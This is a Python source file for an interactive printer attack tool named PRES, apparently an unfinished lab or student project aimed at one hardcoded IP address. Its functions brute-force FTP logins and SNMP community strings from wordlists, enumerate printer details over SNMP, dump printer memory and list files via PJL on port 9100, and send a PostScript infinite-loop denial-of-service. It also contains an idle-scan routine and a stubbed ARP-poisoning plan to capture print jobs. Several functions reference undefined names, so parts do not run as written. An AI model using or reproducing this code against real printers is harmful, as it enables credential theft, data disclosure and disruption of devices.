import os, sys, subprocess, socket, select
from pysnmp import hlapi
from scapy.all import *



model_oids = ['iso.3.6.1.4.1.2435.2.4.3.2435.5.13.3.0']
net_info_oids = ['iso.3.6.1.4.1.2435.2.4.3.1240.5.2.3.0']
hostname_oids = ['iso.3.6.1.4.1.2435.2.4.3.1240.1.1.0']
dns_oids = ['iso.3.6.1.4.1.2435.2.4.3.99.1.7.0','iso.3.6.1.4.1.2435.2.4.3.99.1.8.0','iso.3.6.1.4.1.2435.2.4.4.99.1.1.1.5.1']
firmware_oids = ['iso.3.6.1.4.1.2435.2.4.3.1240.6.5.0']

printers = []

class Printer:

	def __init__(self, name, connection, connectiontype):
		self.name = name
		self.conntype = connectiontype
		self.connection = connection

def exfiltratePrintJobs(target, printer):
	'''
	1. send continous arp poison messages to the printer and target placing myself in the middle
	2. manage and extract all pakcets sent specifically through lpd 
	3. clean up restore arp tables back
	'''
	pass


def zombie_scan(target, zombie):
    for port in ports:
        initial_ipid = collect_ipid(zombie=zombie)
        synack_packet = sr1(IP(dst=target, src=zombie)/TCP(sport=3483, dport=port))
        post_ipid = collect_ipid(zombie=zombie)

        if(initial_ipid + 2 == post_ipid):
            print('[+] Port: {port} is open on {host}'.format(port=port, host=target))


def snmpBruteForce():
	target = '129.21.252.19'
	test_oids = ['iso.3.6.1.4.1.2435.2.3.9.1.1.7.0']
	with open('communityStrings', 'r') as communityStrings:
		for commString in communityStrings:
			result = getInformation(target, test_oids, commString)
			if result is not None:
				print(f'{commString} is a valid community string')


def ftpSend(connection, command):
	connection.send(command.encode())
	data = connection.recv(1024)
	print(data.decode('utf-8'))


def ftpAuthenticate(connCommand, password):
	socketConnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socketConnection.connect(('129.21.252.19', 21))
	socketConnection.settimeout(15.0)
	try:
		ftpSend(socketConnection, connCommand)
	except:
		print('[-] FTP ERROR connecting check IP or username')
		return False
	try:
		ftpSend(socketConnection, password)
	except:
		print('[-] Credentials wrong')
		return False

	return True


def ftpBruteForce():

	with open('users', 'r') as users:
		for username in users.readlines():
			with open('passwords', 'r') as passes:
				for password in passes.readlines():
					connCommand = f'ftp 129.21.252.19 {username}'
					status = ftpAuthenticate(connCommand, password) 
					if status:
						print(f'[+] {username} and {password} valid credential combo Found!')

	print('[+] FTP Bruteforcing complete!')




def getInformation(target, oid_list, communityString):
	snmpManager = hlapi.getCmd(hlapi.SnmpEngine(), hlapi.CommunityData(communityString), hlapi.UdpTransportTarget((target, 161)), hlapi.ContextData(), *construct_object_types(oid_list))
	return fetch(snmpManager, 1)[0]

def construct_object_types(list_of_oids):
    object_types = []
    for oid in list_of_oids:
        object_types.append(hlapi.ObjectType(hlapi.ObjectIdentity(oid)))
    return object_types

def fetch(handler, count):
    result = []
    for i in range(count):
        try:
            error_indication, error_status, error_index, var_binds = next(handler)
            if not error_indication and not error_status:
                items = {}
                for var_bind in var_binds:
                    items[str(var_bind[0])] = cast(var_bind[1])
                result.append(items)
            else:
                raise RuntimeError('Got SNMP error: {0}'.format(error_indication))
        except StopIteration:
            break
    return result

def cast(value):
    try:
        return int(value)
    except (ValueError, TypeError):
        try:
            return float(value)
        except (ValueError, TypeError):
            try:
                return str(value)
            except (ValueError, TypeError):
                pass
    return value

def snmpenumerate():
	ip = '129.21.252.19'
	communityString = 'public'

	#print('----Model Information----')
	data = getInformation(ip, model_oids, communityString)
	for value in data.values():
		print(f'Model: {value}')

	#print('----Network Information----')
	data = getInformation(ip, net_info_oids, communityString)
	for value in data.values():
		count = 0
		print('IP Address: ', end='')
		for char in value:
			print(ord(char),end='')
			
			if count <= 2:
				print('.',end='')

			count+= 1
	print()

	#print('----Hostname Informatxion----')
	data = getInformation(ip, hostname_oids, communityString)
	for value in data.values():
		print(f'Hostname: {value}')

	#print('----DNS Information----')
	data = getInformation(ip, dns_oids, communityString)
	#value 1 and 2 are primary and secondary dns value 3 is the domain
	domain = list(data.values())[2]
	primarydns = list(data.values())[0]
	count = 0
	print('Primary DNS: ', end='')
	for char in primarydns:
		print(ord(char),end='')
			
		if count <= 2:
			print('.',end='')

		count+= 1
	print()

	secondarydns = list(data.values())[1]
	count = 0
	print('Secondary DNS: ', end='')
	for char in secondarydns:
		print(ord(char),end='')
			
		if count <= 2:
			print('.',end='')

		count+= 1
	print()

	print(f'Domain: {domain}')
	
	#print('----Firmware Information----')
	data = getInformation(ip, firmware_oids, communityString)
	for value in data.values():
		print(value)

def commandListing():
	print(
		'''
		help, scan, overlay, quit, select, dos, dump, snmpenumerate, ls
		''')

def dirList():
	connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connection.connect(('129.21.252.19', 9100))
	connection.settimeout(15.0)
	with open('./payloads/pjl/information_disclosure/dir_list.txt', 'r') as file:
		data = file.readlines()

	request = ''
	for item in data:
		request += item
	
	connection.send(request.encode())
	mem_contents = ''
	while True:
		try:
			response = connection.recv(1024)
			mem_contents += response.decode()
		except:
			print('[+] No More Data Being Sent Moving on To Processing!')
			break
	

	try:
		connection.close()
	except:
		pass

	output = mem_contents.split('\n')
	for value in output:
		print(value)
	print('')
	print('[+] DIR Listing Complete!')

def dumpMemory():
	connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connection.connect(('129.21.252.19', 9100))
	connection.settimeout(15.0)
	with open('./payloads/pjl/information_disclosure/mem_dump.txt', 'r') as file:
		data = file.readlines()

	request = ''
	for item in data:
		request += item
	
	connection.send(request.encode())
	mem_contents = ''
	while True:
		try:
			response = connection.recv(1024)
			mem_contents += response.decode()
		except:
			print('[+] No More Data Being Sent Moving on To Processing!')
			break
	

	try:
		connection.close()
	except:
		pass

	output = mem_contents.split('\n')
	for value in output:
		if 'DATA' in value:
			content = value[5:]
			print(chr(int(content.strip())), end='')
	print('')
	print('[+] Memory Dumping Complete!')

def dos(printer):
	print(f'[+] Initiating ddos of {printer.name}!')
	send(printer.conntype, printer, './payloads/postscript/DOS/infinite-loop.ps')

def send(conntype, printer, data):
	if conntype == 'Physical':
		subprocess.run(["lpr", "-P", f"{printer.name}", f"{data}"])
		return
	else:
		print('[-] Printer Connection Error! Try again or Restart!')
		return

def scan():
	print('[+] Scanning for Printers!')
	currentsize = 0
	#physical printer scanning
	print('[+] Scanning for Physically Connected Printers')
	output = subprocess.check_output(["lpstat", "-p"])
	decoded = output.decode()
	results = decoded.split('\n')
	for result in results:
		if "enabled" in result:
			name = result.split(' ')[1]
			conntype = 'Physical'
			connection = ''
			printers.append(Printer(name, connection, conntype))

	if len(printers) == 0:
		print('[-] No Physically Connected Printers Found')
	else:
		currentsize = len(printers)

	'''
	#network printer scanning
	print('[+] Scanning for Printers Connected to the Network using SNMP')
	#DO SNMP Broadcast thingie here

	if len(printers) == 0 or len(printers) == currentsize:
		print('[-] No Printers found via SNMP')
	else:
		currentsize = len(printers)


	#full direct scan of network
	choice = input('[+] Would you like to scan entire network for devices listening on port 9100? (Y/N): ')
	if choice.upper == 'Y':
		#do full scan

	else:
		print('[+] Will not scan entire network')

	print('[+] Scan Complete!')

	if len(printers) == 0:
		print('[-] No printers found on network or physically connected!')
		return
	'''
	for printer in printers:
		print(printer.name)


def overlay():
	print('[+] Initiating Print Job Manipulation')
	data = None
	overlayfile = input('Path to Overlay File: ')
	if overlayfilepath.endswith('ps'):
		print('[+] Obtained Postscript file reading data!')
		#TODO: read file
		try:
			with open(overlayfilepath, 'rb') as file:
				data = file.read()
		except IOError as error:
			print('[-] Error when reading file!')
	else:
		print('[+] Obtained Nonpostscript file converting into usable postscript')

		#TODO: Format file into postscript format
	
	#TODO: send new configuration changes to printer so all future print jobs have the overlay present

def main():
	print(
			'''
			Welcome to PRES!
			''')
	commandListing()

	'''
	HIGH LEVEL OVERVIEW OF TASKS
	
	SCAN FOR PRINTERS AND CHOOSE TARGET
	SEND DATA TO PRINTER OVER USB(LINUX) AND NETWORK
	FIGURE OUT HOW TO DO DDOS ATTACK AND SEND IT OVER

	'''

	while True:
		command = input('$ ')
		
		if command == 'help':
			commandListing()
		elif command == 'scan':
			scan()
		elif command == 'overlay':
			overlay()
		elif command == 'quit':
			sys.exit(0)
		elif command == 'dos':
			index = input('enter which index of a printer you would like: ')
			printer = printers[int(index)]
			dos(printer)
		elif command == 'dump':
			dumpMemory()
		elif command == 'select':
			index = input('enter which index of a printer you would like: ')
			printer = printers[int(index)]
			send(printer.conntype, printer)
		elif command == 'snmpenumerate':
			snmpenumerate()
		elif command == 'ftpBruteForce':
			ftpBruteForce()
		elif command == 'snmpBruteForce':
			snmpBruteForce()
		elif command == 'ls':
			dirList()
		else:
			print('[-] Command Not Recognized! Use help command to get listing of available commands!')
			print()

if __name__ == '__main__':
	main()